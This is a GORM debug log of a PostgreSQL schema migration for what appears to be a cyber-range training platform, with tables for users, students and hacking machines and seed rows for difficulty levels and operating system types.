2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.915ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.441ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[4.756ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'users'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.659ms] [34;1m[rows:-][0m SELECT * FROM "users" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[21.357ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[36.932ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'users'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.619ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'users'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.157ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.209ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.249ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.255ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.254ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'user_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.228ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'first_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.135ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'last_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.338ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'middle_name') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.281ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.037ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.135ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'password') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.096ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'email_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.006ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'phone_verified') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.071ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'users' AND column_name = 'locked') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'users' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.986ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'users' AND indexname = 'idx_users_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.714ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.394ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.678ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.714ms] [34;1m[rows:-][0m SELECT * FROM "students" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.740ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[15.745ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.542ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'students'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.078ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.003ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.021ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.911ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[2.654ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'is_premiem') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.208ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND column_name = 'user_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'students' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[7.549ms] [34;1m[rows:1][0m SELECT count(*) FROM INFORMATION_SCHEMA.table_constraints WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'students' AND constraint_name = 'fk_students_user'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.029ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_students_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.990ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'students' AND indexname = 'idx_student_user' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.829ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.445ms] [34;1m[rows:1][0m SELECT CURRENT_DATABASE()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.632ms] [34;1m[rows:-][0m SELECT c.column_name, c.is_nullable = 'YES', c.udt_name, c.character_maximum_length, c.numeric_precision, c.numeric_precision_radix, c.numeric_scale, c.datetime_precision, 8 * typlen, c.column_default, pd.description, c.identity_increment FROM information_schema.columns AS c JOIN pg_type AS pgt ON c.udt_name = pgt.typname LEFT JOIN pg_catalog.pg_description as pd ON pd.objsubid = c.ordinal_position AND pd.objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = c.table_name AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = c.table_schema)) where table_catalog = 'range' AND table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.792ms] [34;1m[rows:-][0m SELECT * FROM "hacking_machines" LIMIT 5

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.018ms] [34;1m[rows:-][0m SELECT constraint_name FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'hacking_machines' AND constraint_type = 'UNIQUE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[8.303ms] [34;1m[rows:-][0m SELECT c.column_name, constraint_name, constraint_type FROM information_schema.table_constraints tc JOIN information_schema.constraint_column_usage AS ccu USING (constraint_schema, constraint_catalog, table_name, constraint_name) JOIN information_schema.columns AS c ON c.table_schema = tc.constraint_schema AND tc.table_name = c.table_name AND ccu.column_name = c.column_name WHERE constraint_type IN ('PRIMARY KEY', 'UNIQUE') AND c.table_catalog = 'range' AND c.table_schema = CURRENT_SCHEMA() AND c.table_name = 'hacking_machines'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.561ms] [34;1m[rows:-][0m SELECT a.attname as column_name, format_type(a.atttypid, a.atttypmod) AS data_type
		FROM pg_attribute a JOIN pg_class b ON a.attrelid = b.oid AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA())
		WHERE a.attnum > 0 -- hide internal columns
		AND NOT a.attisdropped -- hide deleted columns
		AND b.relname = 'hacking_machines'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.140ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND column_name = 'id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'hacking_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.175ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND column_name = 'created_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'hacking_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.141ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND column_name = 'updated_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'hacking_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[3.073ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND column_name = 'deleted_at') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'hacking_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[1.077ms] [34;1m[rows:0][0m SELECT description FROM pg_catalog.pg_description WHERE objsubid = (SELECT ordinal_position FROM information_schema.columns WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machines' AND column_name = 'image_name_or_id') AND objoid = (SELECT oid FROM pg_catalog.pg_class WHERE relname = 'hacking_machines' AND relnamespace = (SELECT oid FROM pg_catalog.pg_namespace WHERE nspname = CURRENT_SCHEMA()))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.817ms] [34;1m[rows:1][0m SELECT count(*) FROM pg_indexes WHERE tablename = 'hacking_machines' AND indexname = 'idx_hacking_machines_deleted_at' AND schemaname = CURRENT_SCHEMA()

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[0.700ms] [34;1m[rows:1][0m SELECT count(*) FROM information_schema.tables WHERE table_schema = CURRENT_SCHEMA() AND table_name = 'hacking_machine_students' AND table_type = 'BASE TABLE'

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[21.647ms] [34;1m[rows:0][0m CREATE TABLE "hacking_machine_students" ("id" bigserial,"created_at" timestamptz,"updated_at" timestamptz,"deleted_at" timestamptz,"container_nameor_id" text NOT NULL,"student_id" bigint,"hacking_machine_id" bigint,PRIMARY KEY ("id"),CONSTRAINT "fk_hacking_machine_students_student" FOREIGN KEY ("student_id") REFERENCES "students"("id"),CONSTRAINT "fk_hacking_machine_students_hacking_machine" FOREIGN KEY ("hacking_machine_id") REFERENCES "hacking_machines"("id"))

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:155
[0m[33m[12.905ms] [34;1m[rows:0][0m CREATE INDEX IF NOT EXISTS "idx_hacking_machine_students_deleted_at" ON "hacking_machine_students" ("deleted_at")

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:191
[0m[33m[7.037ms] [34;1m[rows:1][0m INSERT INTO "difficulty_levels" ("created_at","updated_at","deleted_at","level") VALUES ('2025-06-09 14:07:49.515','2025-06-09 14:07:49.515',NULL,'very easy') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:191
[0m[33m[5.817ms] [34;1m[rows:1][0m INSERT INTO "difficulty_levels" ("created_at","updated_at","deleted_at","level") VALUES ('2025-06-09 14:07:49.522','2025-06-09 14:07:49.522',NULL,'easy') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:191
[0m[33m[9.094ms] [34;1m[rows:1][0m INSERT INTO "difficulty_levels" ("created_at","updated_at","deleted_at","level") VALUES ('2025-06-09 14:07:49.531','2025-06-09 14:07:49.531',NULL,'medium') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:191
[0m[33m[6.402ms] [34;1m[rows:1][0m INSERT INTO "difficulty_levels" ("created_at","updated_at","deleted_at","level") VALUES ('2025-06-09 14:07:49.538','2025-06-09 14:07:49.538',NULL,'hard') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:191
[0m[33m[7.254ms] [34;1m[rows:1][0m INSERT INTO "difficulty_levels" ("created_at","updated_at","deleted_at","level") VALUES ('2025-06-09 14:07:49.544','2025-06-09 14:07:49.544',NULL,'insane') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[8.361ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.552','2025-06-09 14:07:49.552',NULL,'windows') RETURNING "id"

2025/06/09 14:07:49 [32m/media/mintesnot/3c7cd384-f842-4988-95e5-ab57ac34102c/hdd/projects/database/models/init.go:197
[0m[33m[5.750ms] [34;1m[rows:1][0m INSERT INTO "operating_system_types" ("created_at","updated_at","deleted_at","type") VALUES ('2025-06-09 14:07:49.56','2025-06-09 14:07:49.56',NULL,'linux') RETURNING "id"

